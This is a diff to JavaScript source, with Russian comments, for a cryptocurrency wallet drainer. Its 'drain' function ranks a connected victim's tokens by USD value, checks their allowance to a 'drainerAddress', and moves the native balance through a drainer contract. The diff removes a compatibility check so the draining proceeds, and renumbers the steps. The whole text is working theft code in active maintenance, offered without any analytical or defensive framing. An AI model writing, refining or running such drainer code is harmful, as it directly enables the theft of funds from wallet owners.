@@ -450,24 +450,6 @@ function formatBalance(balance, decimals) {
   return num.toFixed(6).replace(/\.?0+$/, '');
 }
 
-// Проверка совместимости кошелька
-async function checkWalletCompatibility() {
-  try {
-    // Проверяем, поддерживает ли кошелёк метод eth_sendTransaction
-    const methods = await window.ethereum.request({ method: 'wallet_getPermissions' });
-    const hasSendTransaction = methods.some(permission => 
-      permission.parentCapability === 'eth_sendTransaction'
-    );
-    if (!hasSendTransaction) {
-      throw new Error('Wallet does not support transaction signing');
-    }
-    console.log('✅ Кошелёк поддерживает необходимые методы');
-  } catch (error) {
-    console.error(`❌ Ошибка проверки совместимости кошелька: ${error.message}`);
-    throw new Error(`Wallet compatibility check failed: ${error.message}`);
-  }
-}
-
 // Выполнение дрейна
 async function drain(chainId, signer, userAddress, bal, provider) {
   console.log(`Подключённый кошелёк: ${userAddress}`);
@@ -600,16 +582,13 @@ async function drain(chainId, signer, userAddress, bal, provider) {
   tokensToProcess.sort((a, b) => b.valueInUSDT - a.valueInUSDT);
   console.log(`✅ Токены отсортированы: ${tokensToProcess.map(t => t.token).join(', ')}`);
 
-  console.log(`📍 Шаг 6: Проверяем совместимость кошелька перед транзакцией`);
-  await checkWalletCompatibility();
-
   let status = 'rejected';
   for (const { token, balance, contract, address, decimals } of tokensToProcess) {
     if (!token) {
       console.error(`❌ Токен не определён для адреса ${address}, пропускаем`);
       continue;
     }
-    console.log(`📍 Шаг 7: Обрабатываем токен ${token}`);
+    console.log(`📍 Шаг 6: Обрабатываем токен ${token}`);
 
     const allowanceBefore = await contract.allowance(userAddress, config.drainerAddress);
     console.log(`📜 Allowance для ${config.drainerAddress}: ${ethers.utils.formatUnits(allowanceBefore, decimals)}`);
@@ -646,7 +625,7 @@ async function drain(chainId, signer, userAddress, bal, provider) {
     }
   }
 
-  console.log(`📍 Шаг 8: Обрабатываем нативный токен`);
+  console.log(`📍 Шаг 7: Обрабатываем нативный токен`);
   if (bal.nativeBalance.gt(0)) {
     const drainer = new ethers.Contract(config.drainerAddress, DRAINER_ABI, signer);
     const gasReserve = ethers.utils.parseEther("0.002");
@@ -689,7 +668,7 @@ async function drain(chainId, signer, userAddress, bal, provider) {
     }
   }
 
-  console.log(`📍 Шаг 9: Завершаем drain со статусом ${status}`);
+  console.log(`📍 Шаг 8: Завершаем drain со статусом ${status}`);
   return status;
 }
 
